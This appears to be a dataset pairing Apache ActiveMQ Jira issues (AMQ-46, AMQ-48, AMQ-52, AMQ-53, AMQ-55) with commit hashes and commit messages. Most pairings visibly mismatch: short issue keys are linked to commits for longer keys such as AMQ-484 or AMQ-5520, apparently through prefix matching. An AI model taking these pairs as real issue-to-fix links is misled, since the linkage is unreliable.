https://issues.apache.org/jira/browse/AMQ-5519"
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,f4eade2bb3bb83131f17d2768d2218770f0123d3,[AMQ-5520] Use a network interface that actually supports multicast and is up
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,548aa1e41557f00f894fe160219bd155464f6c06,"https://issues.apache.org/jira/browse/AMQ-5525 - worked around the issue with blueprint converter - all. All of the activemq commands have the same single arg signature, so the conversion should be trivial, doing the conversion inline in the default case"
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,de549f8926988ab436084225cdcd6595f1657262,https://issues.apache.org/jira/browse/AMQ-5535 - allow close state reporting w/o contention
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,1c72579d7a0017bd22e800e47d34e3f748601a9a,"https://issues.apache.org/jira/browse/AMQ-5598

Parallel connection test, could not reproduce issue."
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,55f040e616899262d19c2bd1178826a65359516c,https://issues.apache.org/jira/browse/AMQ-5568  - ensure directory exists - fix ci
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,b5856501975ddaeb409c1d1e18e3421575643e8b,https://issues.apache.org/jira/browse/AMQ-5558 - deprecate old ant-based examples
12481291,AMQ-55,To be properly compliant with the spec we should avoid this user error & give a meaningful exception,59958ad2699f70788759b632c8f758568795530a,https://issues.apache.org/jira/browse/AMQ-5552 - exclude two tests that show intermittent failures in ci
12481360,AMQ-53,<NA>,acf84b43e9b7c8aaf92784569075f00e83cf4809,https://issues.apache.org/jira/browse/AMQ-5304 - providing test case
12481360,AMQ-53,<NA>,6bdce73d838abccd8495c979c45bbff8a8bdfc5f,https://issues.apache.org/jira/browse/AMQ-5304 - ignore the test for now
12481360,AMQ-53,<NA>,98f707bd1e733821a02e13b6ae0fe9bc8a0ed9b0,https://issues.apache.org/jira/browse/AMQ-5304 - still missing unit test case
12481360,AMQ-53,<NA>,c391321d1b5b59542d847717654b0d4dba54cf2f,"https://issues.apache.org/jira/browse/AMQ-5315

Fix for potential NPE on transport error."
12481360,AMQ-53,<NA>,7ca25965db5b9ffdfba11b914dafbb36a3504162,added CamelRoutesBrokerPlugin for https://issues.apache.org/jira/browse/AMQ-5351
12481360,AMQ-53,<NA>,2d9475c4f022d3fbf498692f1bb64841d30feb35,"https://issues.apache.org/jira/browse/AMQ-5346

Apply patch for link detach event from @gemmellr"
12481360,AMQ-53,<NA>,74d2c2425fbcbdf38f910f3c321d89780ba2ab6c,"https://issues.apache.org/jira/browse/AMQ-5390

Adds a test case to show that things work as expected."
12481360,AMQ-53,<NA>,162f9fc5590b1403fb4e9b1fb23d249929d8bc62,"https://issues.apache.org/jira/browse/AMQ-5391: offer the ANONYMOUS-RELAY connection capability to
 signal support for the anonymous relay"
12481360,AMQ-53,<NA>,a095e9b9ddc32b7bd47ec2482725f2ccf5300d54,"https://issues.apache.org/jira/browse/AMQ-5310

Adding tests that validate the code follows the JMS Spec expectations
for behavior of closed consumers and producers."
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,845e62af76a836eb41a3b6457fdbac161e6de6c9,https://issues.apache.org/jira/browse/AMQ-5218 - DestinationsPlugin
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,7ceb4d0c8e55364c21e798918eaf1fdb18b95138,"https://issues.apache.org/jira/browse/AMQ-5223

Added the bundle packaging option"
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,fe1d05082860cff8fd2585e6dc3c3e04477e29f8,"AMQ-5242 excluding text because of failures/hangs on AIX, Solaris, Windows"
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,eae21120284b6841b5cd3c4e340d5cbe853f1644,"Exclude some MQTT tests on HP-UX, see AMQ-5267"
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,2b53036b27591ad62db16516bd682e811ffae719,"Excluding some tests which hang Jenkins on Windows and Solaris, see AMQ-5270"
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,6ac3138daff50b8ba0620d31f5b36d83d0316540,"https://issues.apache.org/jira/browse/AMQ-5222

Add test to show this is working as it should."
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,428fc82c8cad36fe600a68cffeb3c4161a345a17,AMQ5266Test can take 8mins locally - exclude from quick tests
12481339,AMQ-52,HOWL log gets a log file overflow exception if you run tests twice without cleaning.  Most likely you are not setting the mark when a message delivery is committed to indicate that the message can be forgotten.,7c116631b504e31fb0bd9f805b1b77090d16f4ff,AMQ-5266 - fix leak in transaction context - completions were not cleared on close/commit
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",eef92026754b0cc94c2b0ba21ece0b531b518b97,"AMQ-484: Restore discoveryUri when replacing TransportConnector with ManagedTransportConnector

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@368911 13f79535-47bb-0310-9956-ffa450edef68"
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",f7311567a022dcdfb00126b4931a485a8afdb134,Fixes https://issues.apache.org/jira/browse/AMQ-4840 - Invalid STOMP frame sent on websocket connections with heartbeats.
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",8f078a3f4ce0599f958c1363e55fbc966013cdba,"https://issues.apache.org/jira/browse/AMQ-4853

Add hashCode and equals override so that this object can be used in
collections properly"
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",6552287221c1706684fb2babe5d9777aabd09531,"https://issues.apache.org/jira/browse/AMQ-4853

adds a little test and preserves some performance tests if needed later."
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",291ec5ea17817cb374c1a2342dd280ee986ebaa3,Fix for https://issues.apache.org/jira/browse/AMQ-4884
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",a6e306437efafc13cf2c2e9d681d5685fdfbcfce,fix for: https://issues.apache.org/jira/browse/AMQ-4893
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",8b06c44cc0028565b1de42bebad024f20fbc1a00,Added test to reproduce AMQ-4887
12481249,AMQ-48,"Seems like the jar files that are being downloaded by maven cause our stuff to fail to compile.

java:compile:
    [echo] Compiling to C:\sandbox\activemq/target/classes
    [javac] Compiling 345 source files to C:\sandbox\activemq\target\classes
C:\sandbox\activemq\src\java\org\codehaus\activemq\transport\gnet\GTransportChannel.java:162: cannot resolve symbol
symbol  : method flush ()
location: interface org.apache.geronimo.network.protocol.Protocol
                                getDownProtocol().flush();",5e42bd64bcf3c1557f2f108f57124e3e066ec158,"Added no-op version of testVirtualTopicFailover, which is covered by AMQ-4842"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",d06b32bab3ad3c98c7802ce3955ab8512d449cde,"PR: AMQ-461
Submitted by: Bill Dudney
m2 poms need patches

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@365390 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",935ce6596843f0b505a1f79dc30b9f9984853f24,"added test case for AMQ-464

git-svn-id: https://svn.apache.org/repos/asf/incubator/activemq/trunk@366119 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",a971b648ea8f9fcaa376f93811a3abaee7c667e1,"https://issues.apache.org/jira/browse/AMQ-4637 - populate DLQ_DELIVERY_FAILURE_CAUSE_PROPERTY for messages that exceed a redelivery policy - makes it easier to identify in the dlq

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1504423 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",3940f2dffd7f6c26710b016b0065b1a5621ea61f,"https://issues.apache.org/jira/browse/AMQ-4640


git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1506079 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",4a270fe1f0bf78087e1f7ed342f30b80e06a1559,"apply patch for: https://issues.apache.org/jira/browse/AMQ-4655

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1507346 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",ccde93a238b8882818d724c665787d547cc289e7,"https://issues.apache.org/jira/browse/AMQ-4656 - adding a test

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1511334 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",dd286e2381d163ef3a77833dcb5e7d0e36b42104,"Fixes AMQ-4672 - [JMS Client] Set the SNI field on SSL connections

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1511335 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",ddd4d9fff2c381e81bc44519777a37802b19df8d,"fix add missing file from https://issues.apache.org/jira/browse/AMQ-4655

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1511780 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",717345f499fb022bc5e82496b6ff1d29092aad0d,"test to show that: https://issues.apache.org/jira/browse/AMQ-4677 is not an issue.  Verifies that the LevelDB logs are cleared as messages are consumed.  

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1514502 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",8f4ebbb40eec530669fed031a3fc397b490caac6,"Added Interceptor to support 
https://issues.apache.org/jira/browse/AMQ-4690

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1517222 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",b92a315599d53b07e2ed4eff1c6f0345f048c0a8,"Fix for https://issues.apache.org/jira/browse/AMQ-4690

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1517905 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",61877f3477448b5cdda9c094de6f54a3d37037fe,"Fix for https://issues.apache.org/jira/browse/AMQ-4690

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1517926 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",0d98623b7b2d768e4374aead79e652856d6cbe5e,"Added SizeStatisicsImpl for https://issues.apache.org/jira/browse/AMQ-4697

git-svn-id: https://svn.apache.org/repos/asf/activemq/trunk@1518217 13f79535-47bb-0310-9956-ffa450edef68"
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
JmsQueueConnectionFactory/ClassName=org.codehaus.activemq.ActiveMQConnectionFactory
JmsQueueConnectionFactory/RefAddr/2/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Content=defaultPassword

How are other people getting their connections from Jndi?",29b90b58129e7a78cc00dabde923002da133efdf,https://issues.apache.org/jira/browse/AMQ-4643 - have keepAlive task trap the new suppressreplyexception such that it can stay alive and renew a lease on resumption
12481334,AMQ-46,"I created the following FS JNDI context, but noticed that the FactoryName is an interface, which I thought might be causing the problem -

#This file is used by the JNDI FSContext.
#Thu Jul 29 10:42:05 EST 2004
JmsQueueConnectionFactory/RefAddr/3/Content=defaultUser
JmsQueueConnectionFactory/RefAddr/3/Type=userName
JmsQueueConnectionFactory/FactoryName=org.codehaus.activemq.jndi.JNDIStorableInterface
JmsQueueConnectionFactory/RefAddr/0/Type=brokerURL
JmsQueueConnectionFactory/RefAddr/0/Encoding=String
JmsQueueConnectionFactory/RefAddr/3/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Encoding=String
JmsQueueConnectionFactory/RefAddr/1/Type=password
JmsQueueConnectionFactory/RefAddr/0/Content=tcp\://localhost\:61616
JmsQueueConnectionFactory/RefAddr/2/Content=false
JmsQueueConnectionFactory/RefAddr/2/Type=useEmbeddedBroker
